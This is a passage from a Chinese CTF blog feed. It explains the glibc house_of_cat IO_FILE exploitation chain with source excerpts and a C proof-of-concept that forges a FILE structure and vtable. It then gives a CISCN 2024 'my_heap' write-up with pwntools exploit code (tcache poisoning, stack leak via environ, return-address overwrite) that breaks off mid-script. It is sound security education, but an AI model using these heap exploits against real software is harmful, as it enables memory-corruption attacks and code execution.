<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">locked_vfxprintf</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *fmt, va_list ap,</span></span><br><span class="line"><span class="params">		  <span class="type">unsigned</span> <span class="type">int</span> mode_flags)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_fwide (fp, <span class="number">0</span>) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> __vfprintf_internal (fp, fmt, ap, mode_flags);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We must convert the narrow format string to a wide one.</span></span><br><span class="line"><span class="comment">     Each byte can produce at most one wide character.  */</span></span><br><span class="line">  <span class="type">wchar_t</span> *wfmt;</span><br><span class="line">  <span class="type">mbstate_t</span> mbstate;</span><br><span class="line">  <span class="type">int</span> res;</span><br><span class="line">  <span class="type">int</span> used_malloc = <span class="number">0</span>;</span><br><span class="line">  <span class="type">size_t</span> len = <span class="built_in">strlen</span> (fmt) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (len &gt; SIZE_MAX / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (EOVERFLOW);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (__libc_use_alloca (len * <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)))</span><br><span class="line">    wfmt = alloca (len * <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>));</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ((wfmt = <span class="built_in">malloc</span> (len * <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>))) == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    used_malloc = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span> (&amp;mbstate, <span class="number">0</span>, <span class="keyword">sizeof</span> mbstate);</span><br><span class="line">  res = __mbsrtowcs (wfmt, &amp;fmt, len, &amp;mbstate);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (res != <span class="number">-1</span>)</span><br><span class="line">    res = __vfwprintf_internal (fp, wfmt, ap, mode_flags);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (used_malloc)</span><br><span class="line">    <span class="built_in">free</span> (wfmt);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>__malloc_assert --&gt; __fxprintf --&gt; __vfxprintf --&gt; locked_vfxprintf --&gt; __vfprintf_internal --&gt; vfprintf</code></p>
<p>到源码的画质看到了这里，源码网站没有找到</p>
<p>通过写poc的方式继续看下一步如何进行</p>
<p>进行带源码调试</p>
<p>断在了<code>__malloc_assert</code></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/image-20240511180849373.png"
                      alt="image-20240511180849373"
                ><figcaption>image-20240511180849373</figcaption></figure></p>
<p>接着运行发现程序会卡在这里</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/image-20240511181629991.png"
                      alt="image-20240511181629991"
                ><figcaption>image-20240511181629991</figcaption></figure></p>
<p>去查看一下源码</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_flockfile(_fp) \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (((_fp)-&gt;_flags &amp; _IO_USER_LOCK) == 0) _IO_lock_lock (*(_fp)-&gt;_lock)</span></span><br></pre></td></tr></table></figure></div>

<p>是一个宏定义，然后去看一下汇编，看下卡在了哪里</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/image-20240511182401580.png"
                      alt="image-20240511182401580"
                ><figcaption>image-20240511182401580</figcaption></figure></p>
<p>发现此时是进行一个比较，rdi并不是一个可写的地址，所以我们应该在对应位置提供一个可写的位置。</p>
<p>后面可以发现对应的位置在<code>_lock</code>位置。</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/image-20240511182812293.png"
                      alt="image-20240511182812293"
                ><figcaption>image-20240511182812293</figcaption></figure></p>
<p>接着改了之后</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/image-20240511183342597.png"
                      alt="image-20240511183342597"
                ><figcaption>image-20240511183342597</figcaption></figure></p>
<p>发现确实可以一直运行下去了</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/image-20240511191117808.png"
                      alt="image-20240511191117808"
                ><figcaption>image-20240511191117808</figcaption></figure></p>
<p>这里有一个判断，还是看源码</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_fwide (FILE *fp, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Normalize the value.  */</span></span><br><span class="line">  mode = mode &lt; <span class="number">0</span> ? <span class="number">-1</span> : (mode == <span class="number">0</span> ? <span class="number">0</span> : <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (&amp;_IO_stdin_used == <span class="literal">NULL</span>) &amp;&amp; _IO_legacy_file (fp))</span><br><span class="line">    <span class="comment">/* This is for a stream in the glibc 2.0 format.  */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The orientation already has been determined.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode != <span class="number">0</span></span><br><span class="line">      <span class="comment">/* Or the caller simply wants to know about the current orientation.  */</span></span><br><span class="line">      || mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> fp-&gt;_mode;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set the orientation appropriately.  */</span></span><br><span class="line">  <span class="keyword">if</span> (mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> =</span> fp-&gt;_codecvt = &amp;fp-&gt;_wide_data-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_ptr = fp-&gt;_wide_data-&gt;_IO_write_base;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Get the character conversion functions based on the currently</span></span><br><span class="line"><span class="comment">	 selected locale for LC_CTYPE.  */</span></span><br><span class="line">      &#123;</span><br><span class="line">	<span class="comment">/* Clear the state.  We start all over again.  */</span></span><br><span class="line">	<span class="built_in">memset</span> (&amp;fp-&gt;_wide_data-&gt;_IO_state, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> (<span class="type">__mbstate_t</span>));</span><br><span class="line">	<span class="built_in">memset</span> (&amp;fp-&gt;_wide_data-&gt;_IO_last_state, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> (<span class="type">__mbstate_t</span>));</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">gconv_fcts</span> <span class="title">fcts</span>;</span></span><br><span class="line">	__wcsmbs_clone_conv (&amp;fcts);</span><br><span class="line">	assert (fcts.towc_nsteps == <span class="number">1</span>);</span><br><span class="line">	assert (fcts.tomb_nsteps == <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	cc-&gt;__cd_in.step = fcts.towc;</span><br><span class="line"></span><br><span class="line">	cc-&gt;__cd_in.step_data.__invocation_counter = <span class="number">0</span>;</span><br><span class="line">	cc-&gt;__cd_in.step_data.__internal_use = <span class="number">1</span>;</span><br><span class="line">	cc-&gt;__cd_in.step_data.__flags = __GCONV_IS_LAST;</span><br><span class="line">	cc-&gt;__cd_in.step_data.__statep = &amp;fp-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line"></span><br><span class="line">	cc-&gt;__cd_out.step = fcts.tomb;</span><br><span class="line"></span><br><span class="line">	cc-&gt;__cd_out.step_data.__invocation_counter = <span class="number">0</span>;</span><br><span class="line">	cc-&gt;__cd_out.step_data.__internal_use = <span class="number">1</span>;</span><br><span class="line">	cc-&gt;__cd_out.step_data.__flags = __GCONV_IS_LAST | __GCONV_TRANSLIT;</span><br><span class="line">	cc-&gt;__cd_out.step_data.__statep = &amp;fp-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* From now on use the wide character callback functions.  */</span></span><br><span class="line">      _IO_JUMPS_FILE_plus (fp) = fp-&gt;_wide_data-&gt;_wide_vtable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set the mode now.  */</span></span><br><span class="line">  fp-&gt;_mode = mode;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> mode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其实主要就是判断mode的值,其实是对流程没有影响的，接着就从__vfprintf_internal直接跳到了vfprintf这里，之后调用链1就差不太多了</p>
<p>接着就是<code>(io-&gt;vatable)</code>–&gt;_IO_wfile_seekoff–&gt;调用链2，利用_IO_wfile_seekoff跳过虚表检测</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wfile_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_new_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wfile_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wfile_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wfile_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br><span class="line">libc_hidden_data_def (_IO_wfile_jumps)</span><br></pre></td></tr></table></figure></div>

<p>他是在一个跳表上的</p>
<p>继续跟进发现调用了_IO_wfile_xsputn</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/image-20240512213544930.png"
                      alt="image-20240512213544930"
                ><figcaption>image-20240512213544930</figcaption></figure></p>
<p>我们的重点是调用seekoff，所以继续修改poc，将这个地址加0x10</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/image-20240512213721342.png"
                     
                ></p>
<p>然后断在了这里</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/image-20240512213832585.png"
                      alt="image-20240512213832585"
                ><figcaption>image-20240512213832585</figcaption></figure></p>
<p>这就是调用链1</p>
<p>POC：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> puts_addr = &amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x80ed0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> * stderr_ = libc_base + <span class="number">0x21a860</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="type">size_t</span> * ptr = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="type">size_t</span> heapbase = ptr - <span class="number">0x2a0</span>;</span><br><span class="line"></span><br><span class="line">    * stderr_ = ptr - <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    ptr[<span class="number">0xf</span>] = heapbase + <span class="number">0x5000</span>; <span class="comment">//_lock</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> _IO_wfile_jumps = libc_base + <span class="number">0x2160c0</span>;</span><br><span class="line">    ptr[<span class="number">0x19</span>] = _IO_wfile_jumps + <span class="number">0x10</span>;<span class="comment">//vtable</span></span><br><span class="line"></span><br><span class="line">    ptr[<span class="number">0x508</span>/<span class="number">8</span>] = <span class="number">0x55</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x500</span>);<span class="comment">//__malloc_assert</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="调用链2"><a href="#调用链2" class="headerlink" title="调用链2"></a>调用链2</h2><p>接着上一条链子</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Short-circuit into a separate function.  We don&#x27;t want to mix any</span></span><br><span class="line"><span class="comment">     functionality and we don&#x27;t want to touch anything inside the FILE</span></span><br><span class="line"><span class="comment">     object. */</span></span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* POSIX.1 8.2.3.7 says that after a call the fflush() the file</span></span><br><span class="line"><span class="comment">     offset of the underlying file must be exact.  */</span></span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">			== fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">		       &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">			   == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">		       &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">		      || _IO_in_put_mode (fp));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flush unwritten characters.</span></span><br><span class="line"><span class="comment">     (This may do an unneeded write if we seek within the buffer.</span></span><br><span class="line"><span class="comment">     But to be able to switch to reading, we would need to set</span></span><br><span class="line"><span class="comment">     egptr to pptr.  That can&#x27;t be done in the current design,</span></span><br><span class="line"><span class="comment">     which assumes file_ptr() is eGptr.  Anyway, since we probably</span></span><br><span class="line"><span class="comment">     end up flushing when we close(), it doesn&#x27;t make much difference.)</span></span><br><span class="line"><span class="comment">     <span class="doctag">FIXME:</span> simulate mem-mapped files. */</span></span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br></pre></td></tr></table></figure></div>

<p>截取了部分代码，发现了<code>_IO_switch_to_wget_mode</code>，</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_backup_base;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">	fp-&gt;_wide_data-&gt;_IO_read_end = fp-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_base = fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    = fp-&gt;_wide_data-&gt;_IO_write_end = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_CURRENTLY_PUTTING;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在上面的<code>_IO_wfile_seekoff</code>中<code>was writing</code>要为1</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/image-20240512215449761.png"
                      alt="image-20240512215449761"
                ><figcaption>image-20240512215449761</figcaption></figure></p>
<p>也就是说只要令红框内的为真即可，就是write_ptr &gt; write_base，但是我们并不能随意地进行赋值，因为它是通过wide_data来进行寻找的，所以应该先把wide_data进行一个赋值</p>
<p>直接在ptr上面的就行</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/image-20240512221628746.png"
                      alt="image-20240512221628746"
                ><figcaption>image-20240512221628746</figcaption></figure></p>
<p>在这种情况下，我们根据汇编进行的赋值，最后的结果就是可以控制返回地址以及rcx和rdx</p>
<p>到这里整个利用链就完事了，再往后就是打orw啥的了，跟调试链子关系不是很大了就。</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>[强网杯 2022 初赛]house_of_cat：</p>
<a class="button " href='https://berial.cn/posts/2022qwbhouse_of_cat/ fa-play-circle' title='2022qwbhouseofcat'>2022qwbhouseofcat</a>
]]></content>
      <categories>
        <category>Pwn</category>
        <category>IO_FILE</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>IO_FILE</tag>
      </tags>
  </entry>
  <entry>
    <title>2024ciscn华南分赛区Pwn</title>
    <url>/posts/2024ciscn%E5%8D%8E%E5%8D%97%E5%88%86%E8%B5%9B%E5%8C%BAPwn.html</url>
    <content><![CDATA[<p>难评。。。</p>
<h1 id="my-heap"><a href="#my-heap" class="headerlink" title="my_heap"></a>my_heap</h1><details class="red" data-header-exclude><summary><i class="fa-solid fa-chevron-right"></i>考点 </summary>
              <div class='content'>
              <p>1、UAF</p><p>2、利用python脚本对异或的处理</p><p>3、堆指针复用</p><p>4、 double free</p><p>5、tcache poisoning</p><p>6、tcache perthread corruption</p>
              </div>
            </details>

<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/1718009188083-ec8f9b32-6b0d-4be0-8bbf-fd70a1af99c4.png"
                      alt="img"
                ><figcaption>img</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/1718009205539-e13bce13-ae02-4c33-859b-ea2098af6bac.png"
                      alt="img"
                ><figcaption>img</figcaption></figure></p>
<p>add：</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/1718009218898-873ebab7-339c-413f-8f9f-c0d79183de6d.png"
                      alt="img"
                ><figcaption>img</figcaption></figure></p>
<p>如果不是1就申请0x4f0大小的chunk（利用这个可以防止top chunk合并）</p>
<p>delete：</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/1718009248470-a962ae65-7db3-47ed-8d48-a5fa08a83508.png"
                      alt="img"
                ><figcaption>img</figcaption></figure></p>
<p>UAF</p>
<p>show：</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/1718009262174-99438811-7403-4e7f-b461-764e68732bcb.png"
                      alt="img"
                ><figcaption>img</figcaption></figure></p>
<p>有一个异或</p>
<p>magic：</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/1718009286645-728e033e-90ed-47c4-a53e-a24270e461b5.png"
                      alt="img"
                ><figcaption>img</figcaption></figure></p>
<p>泄露后门函数地址，然后往当前指针堆块写入0x10大小，但只有一次</p>
<h2 id="解题过程（及每部分的脚本）"><a href="#解题过程（及每部分的脚本）" class="headerlink" title="解题过程（及每部分的脚本）"></a>解题过程（及每部分的脚本）</h2><p>利用magic可以tcache attack，将堆块申请到tcache结构体</p>
<p>首先就是把地址泄露出来</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># leak libcbase &amp; heapbase</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x500</span>)</span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">&#x27;which one you choose?\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">free()</span><br><span class="line">base = u64(show()) - <span class="number">0x21ace0</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>)</span><br><span class="line">free()</span><br><span class="line">key = u64(show())</span><br><span class="line">heapbase = key &lt;&lt; <span class="number">12</span></span><br></pre></td></tr></table></figure></div>

<p>这一部分就是利用UAF，然后再去利用magic清空fd和bk</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># leak backdoor &amp; clean bk</span></span><br><span class="line">magic()</span><br><span class="line">ru(<span class="string">&quot;magic address: &quot;</span>)</span><br><span class="line">backdoor = <span class="built_in">int</span>(io.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">s(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure></div>

<p>再接着利用double free将对申请到heapbase</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">free()</span><br><span class="line">edit(p64((heapbase + <span class="number">0x10</span>) ^ key))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>)</span><br></pre></td></tr></table></figure></div>

<p>接着就是各种准备</p>
<details class="red" data-header-exclude><summary><i class="fa-solid fa-chevron-right"></i>准备 </summary>
              <div class='content'>
              <ol><li>申请到tcache结构体后先释放掉，然后在申请回来，可以一直申请0x280大小来利用</li><li>再将tcache结构体释放到tcache</li><li>申请0x20大小堆块并释放掉（后期会利用UAF写入environ地址泄露栈地址）</li><li>申请0x30大小堆块并释放掉（后期会利用UAF写入返回地址并edit为后门地址）</li></ol>
              </div>
            </details>

<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x280</span>)</span><br><span class="line">free()</span><br><span class="line">edit(p64(<span class="number">0</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x30</span>)</span><br><span class="line">free()</span><br></pre></td></tr></table></figure></div>

<p>然后将tcache结构体申请回来，利用UAF（tcache perthread corruption）将0x30和0x40的位置设置为两块（但实际现在每个大小里面只有一块）</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">1</span>, <span class="number">0x280</span>)</span><br><span class="line">free()</span><br><span class="line">edit(<span class="string">b&#x27;\x00\x00&#x27;</span> + <span class="string">b&#x27;\x02\x00&#x27;</span> + <span class="string">b&#x27;\x02\x00&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>使用tcache poisoning将environ地址放入0x30大小的tcachebin面，并泄露stack地址</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># leak stack</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>)</span><br><span class="line">free()</span><br><span class="line">environ = base + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">edit(p64(environ ^ key))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>)</span><br><span class="line">stack = u64(show())</span><br></pre></td></tr></table></figure></div>

<p>然后和上面同样的方法将存放堆指针的地址写入0x40大小的tcache，需要算下程序基址，然后将存放返回地址的栈地址放入buf，再edit为backdoor</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># change ret_addr</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x30</span>)</span><br><span class="line">free()</span><br><span class="line">buf_addr = backdoor - <span class="number">0x12BE</span> + <span class="number">0x4040</span></span><br><span class="line">ret_addr = stack - <span class="number">0x140</span></span><br><span class="line">edit(p64(buf_addr ^ key))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x30</span>)</span><br><span class="line">edit(p64(ret_addr))</span><br><span class="line">edit(p64(backdoor+<span class="number">5</span>))</span><br></pre></td></tr></table></figure></div>

<p>然后就会直接返回到后门函数了。</p>
<h2 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> log</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">banary = <span class="string">&quot;./my_heap&quot;</span></span><br><span class="line">elf = ELF(banary)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&quot;/home/berial/libc/64bit/libc-2.27.so&quot;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/home/berial/libc/64bit/libc-2.23.so&quot;)</span></span><br><span class="line"><span 